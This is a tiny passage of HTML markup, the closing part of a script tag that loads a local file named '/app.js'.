src="/app.js"></script>
